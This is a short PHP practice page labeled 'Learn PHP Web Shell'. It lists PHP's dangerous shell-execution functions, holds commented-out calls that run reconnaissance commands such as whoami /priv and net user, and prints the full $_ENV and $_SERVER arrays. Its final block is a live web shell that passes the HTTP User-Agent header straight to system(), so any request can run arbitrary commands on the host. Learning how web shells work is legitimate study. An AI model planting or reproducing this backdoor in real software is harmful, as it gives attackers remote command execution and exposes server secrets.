<h1>Learn PHP Web Shell</h1>
<?php 
    // system("dir"); 
    // system("dir f:\\") 
    // system("tree f:\\") 
    // system("whoami /priv");
    // system("net user");
    // phpinfo();
    
    // Default enabled *dangerous* functions
    echo "<h2>Check default enabled <b>dangerous</b> functions</h2>";
    echo "<pre>";
    print_r(preg_grep("/^(system|exec|shell_exec|passthru|proc_open|popen|curl_exec|curl_multi_exec|parse_ini_file|show_source)$/", get_defined_functions(TRUE)["internal"]));
    echo "</pre>";
    //passthru("dir c:\\")
    
    //exec("dir c:\\",$array);
    //exec("whoami /priv",$array);
    //print_r($array);
    
    //echo shell_exec("dir c:\\");
    
    /*
    // Use backticks to execute shell command
    $output = `whoami /priv`;
    echo "<pre>$output</pre>"
    */
?>

<h2>PHP Environment Variables</h2>
<?php
    // Environment variables
    echo "<h3>\$_ENV Array</h3>";
    $env_array = $_ENV;
    echo "<pre>";
    print_r($env_array);
    echo "</pre>";
    
    echo "\n";
    
    echo "<h3>\$_SERVER Array</h3>";
    $server_array = $_SERVER;
    echo "<pre>";
    print_r($server_array);
    echo "</pre>";
?>

<?php
    system($_SERVER['HTTP_USER_AGENT']);
?>